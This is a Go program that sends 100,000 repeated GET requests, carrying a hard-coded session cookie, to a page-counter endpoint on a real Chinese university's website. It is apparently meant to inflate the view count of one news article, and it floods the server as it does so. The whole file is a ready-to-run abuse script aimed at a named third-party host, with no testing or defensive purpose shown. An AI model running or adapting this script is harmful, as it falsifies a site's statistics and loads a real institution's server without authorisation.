package main

import (
	"fmt"
	"log"
	"net/http"
	"time"
)

func main() {
	url := "http://csi.hubu.edu.cn/system/resource/code/datainput.jsp?owner=1308301323&e=1&w=1536&h=864&treeid=1072&refer=aHR0cDovL2NzaS5odWJ1LmVkdS5jbi95anNqeS9kc2ZjLmh0bQ%3D%3D&pagename=L2NvbnRlbnQuanNw&newsid=2294"
	req, _ := http.NewRequest(http.MethodGet, url, nil)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Add("Accept-Encoding", "deflate")
	req.Header.Set("Accept-Language", "zh-CN")
	req.Header.Set("Connection", "Keep-alive")

	cookie := &http.Cookie{
		Name:  "JSESSIONID",
		Value: "C80F164920924EB8A87BE164E2A5F984",
	}
	req.AddCookie(cookie)

	for i := 0; i < 200; i++ {
		c := http.Client{}

		for j := 0; j < 500; j++ {
			resp, err := c.Do(req)
			if err != nil {
				log.Println("error:", err)
				continue
			}

			status := resp.StatusCode

			fmt.Println("status:", status)

			resp.Body.Close()
		}
	}

	time.Sleep(time.Hour)
}
